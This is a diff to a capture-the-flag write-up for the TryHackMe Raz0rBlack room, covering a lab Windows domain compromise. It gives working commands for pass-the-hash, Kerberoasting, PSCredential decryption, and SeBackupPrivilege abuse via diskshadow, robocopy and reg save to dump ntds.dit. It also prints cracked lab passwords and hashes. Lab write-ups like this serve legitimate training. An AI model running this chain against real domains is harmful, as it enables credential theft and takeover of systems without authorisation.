@@ -2,6 +2,8 @@
 
 Room Link --> [https://tryhackme.com/room/raz0rblack](https://tryhackme.com/room/raz0rblack)
 
+### Enumeration
+
 Nmap scan
 
 {% code overflow="wrap" lineNumbers="true" %}
@@ -236,7 +238,7 @@ secretsdump -ntds ntds.dit -system system.hive LOCAL | tee hash_dump.txt
 
 We got a huge list of hashes.
 
-**What is Ljudmila’s Hash?**
+### **Ljudmila’s Hash?**
 
 After formating the list: `cat hash_dump.txt| cut -d ":" -f4 > clean_hashes.txt` - this will format the list and save only the NTHash part.
 
@@ -244,34 +246,229 @@ After formating the list: `cat hash_dump.txt| cut -d ":" -f4 > clean_hashes.txt`
 
 We can use "crackmapexec" for pass the hash attack to discover "**Ljudmila’s Hash"**&#x20;
 
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+crackmapexec smb 10.10.90.215 -u lvetrova -H clean_hashes.txt
+# we found the hash.
 ```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption><p>10</p></figcaption></figure>
+
+We use pass-the-hash attack with Evil-WinRm to login as "lvetrova"
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+evil-winrm -i 10.10.90.215 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
 ```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption><p>11</p></figcaption></figure>
+
+### Ljudmila's Flag
+
+To get the flag, we saw a "lvetrova.xml" file containing the credentials. From the content it seems that it’s a xml representation of PSCredential Object. :
+
+{% code overflow="wrap" lineNumbers="true" %}
+```xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">Your Flag is here =&gt;</S>
+      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d</SS>
+    </Props>
+  </Obj>
+</Objs>
+```
+{% endcode %}
+
+PowerShell has a method for storing encrypted credentials that can only be accessed by the user account that stored them. To retrieve the credential and using it within a script, you read it from the XML file. We will use this method to get the user’s hash
+
+Reference --> [https://medium.com/@whoamihasin/powershell-credentials-for-pentesters-securestring-pscredentials-787263abf9d8](https://medium.com/@whoamihasin/powershell-credentials-for-pentesters-securestring-pscredentials-787263abf9d8)
+
+{% code lineNumbers="true" %}
+```powershell
+$Credential = Import-Clixml -Path "lvetrova.xml"
+$Credential.GetNetworkCredential().password
+# we got the flag.
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption><p>12</p></figcaption></figure>
+
+### Xyan1d3's password?
+
+The next step is **"Kerberoasting"** ie, using the Impacket's "GetUserSPN.py" to look for Service Accounts or users accounts with the SPN value set.
+
+Normally we'd want to do a pass-the-hash, same way we got credentials for "lvetrova" hash, but there are almost 7000 hashes, that could be a deadend (obviously it is :( so Kerberoasting seem like the easy next step from here.
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+# Here we use the hashes for Lvetrova, since it is a valid cred.
+GetUserSPNs.py raz0rblack.thm/lvetrova -hashes aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d -dc-ip 10.10.90.215 -request -outputfile kerberos_users.txt
+
+# and we got Xyan1d3's hash.
+```
+{% endcode %}
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>13</p></figcaption></figure>
+
+We crack it with john.
+
+<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption><p>14</p></figcaption></figure>
+
+xyan1d3 : cyanide9amine5628
+
+### Xyan1d3's Flag
+
+We login with Evil-winRM: `evil-winrm -i 10.10.90.215 -u xyan1d3 -p cyanide9amine5628` .
+
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption><p>15</p></figcaption></figure>
+
+{% code overflow="wrap" lineNumbers="true" %}
+```powershell
+$Credential = Import-Clixml -Path "xyan1d3.xml"
+$Credential.GetNetworkCredential().password
+# we got the flag.
+```
+{% endcode %}
+
+## Root Flag
+
+This involves Privilege escalation.
+
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption><p>16</p></figcaption></figure>
+
+We check the Priviliges for the "Xyanld3.xml" user and we see we have both the "**SeBackupPrivilege**" and "**SeRestorePrivilege**" privileges.
+
+### **SeBackupPrivilege Priv Esc**
+
+{% hint style="success" %}
+we will go over abusing the _**SeBackupPrivilege**_ to escalate on a Windows machine. This privilege provides users with full read permissions and the ability to create system backups. The full read access allows for reading any file on the machine, including the system-sensitive files like _**SAM, SYSTEM hives, or NTDS.dit**_.
+
+An attacker can leverage this privilege to extract the hashes from these files and either crack them or pass them (PTH) to elevate their shell.
+
+📌_In <mark style="color:red;">**workstations**</mark>, we need the **SAM and System hive files** to extract the hashes**,** while in <mark style="color:red;">domain controller machines</mark>, we need the **ntds.dit** file and **system hive** . Since we are in a Domain Controller._
+{% endhint %}
+
+Reference --> [Priv Esc using SeBackupPrivilege](https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960)
+
+There are couple of methods to leverage for this attack:
+
+* **Shadow Copies with Diskshadow Utility + Robocopy**
+* **Dynamic Link Library (DLLs) + Shadow Copies**
+* **Wbadmin Utility**
+
+#### Disk shadow + Robocopy <a href="#0193" id="0193"></a>
+
+Diskshadow is a Windows built-in utility that can create copies of a drive that is currently in use.
+
+Here is the script, we can run to get the files (save in a .txt file and upload to victim.)
+
+Create a "C:\tmp" dir, put the file in there.
+
+<pre class="language-bash" data-title="diskshadow.txt" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>set verbose onX
+</strong><strong>set metadata C:\Windows\Temp\meta.cabX
+</strong><strong>set context clientaccessibleX
+</strong><strong>set context persistentX
+</strong><strong>begin backupX
+</strong><strong>add volume C: alias cdriveX
+</strong><strong>createX
+</strong><strong>expose %cdrive% E:X
+</strong><strong>end backupX
+</strong></code></pre>
+
+We ass the script to **diskshadow utility** to create the shadow copy.
+
+`diskshadow /s diskshadow.txt`
+
+<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption><p>17</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption><p>18</p></figcaption></figure>
+
+Successfully copied.
+
+Switch to the _**E: Drive**_, copy the NTDS file using _**Robocopy**_ to the Temp file we created in the C: drive.
+
+`cd E:`&#x20;
+
+Switch back to the C:\tmp drive, and type this:
+
+`robocopy /b E:\Windows\ntds . ntds.dit` .
+
+<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption><p>19</p></figcaption></figure>
+
+Next we get the system registry hive that contains the key needed to decrypt the NTDS file with _**reg save**_ command.
+
+<pre><code><strong>reg save hklm\system c:\temp\system
+</strong></code></pre>
+
+\
 
 
+<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption><p>20</p></figcaption></figure>
 
+Successfully copied both required files, now send them to kali, and we can use "secretsdump.py" to dump the entire DC hash database.
 
+Since we are in Evil-WinRM, we can use:
 
+`download ntds.dit` and `download system` to download both files, this will take time :(
 
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+secretsdump.py -system system -ntds ntds.dit LOCAL > dc_hashes.txt
+```
+{% endcode %}
 
+<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption><p>21</p></figcaption></figure>
 
+We got the admin hash. Now we can do pass-the-hash attack on the Admin account.
 
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+evil-winrm -i 10.10.137.61 -u Administrator -H 9689931bed40ca5a2ce1218210177f0c
+```
+{% endcode %}
 
+<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption><p>22</p></figcaption></figure>
 
+There are 2 files in the Admin dir:
 
+* The cookie.json is a base64, we used "base64 -d" to decode it. Nothing fancy.
+* The "root.xml" was not like the other xml files, instead i put it in ChatGPT and it recognized it as "Hexadecimal", so i asked it to reverse it and BOOM! got the flag.
 
+{% code title="root.xml" overflow="wrap" lineNumbers="true" %}
+```xml
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
+  <Obj RefId="0">
+    <TN RefId="0">
+      <T>System.Management.Automation.PSCredential</T>
+      <T>System.Object</T>
+    </TN>
+    <ToString>System.Management.Automation.PSCredential</ToString>
+    <Props>
+      <S N="UserName">Administrator</S>
+      <SS N="Password">44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a</SS>
+  </Obj>
+</Objs>
+```
+{% endcode %}
 
+### Tyson's Flag
 
+Just cd into "twilliams" folder. Found a funny .exe file.
 
+<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption><p>23</p></figcaption></figure>
 
+After moving through the directories we find a folder named `"C:\Program Files\Top Secret"`
 
+There is an image in that folder. We can download it and analyze it for the flag.
 
+It's pretty obvious by seeing the picture that the answer here is `:wq`
 
-
-
-
-
-
-
-
-
-
+Done!
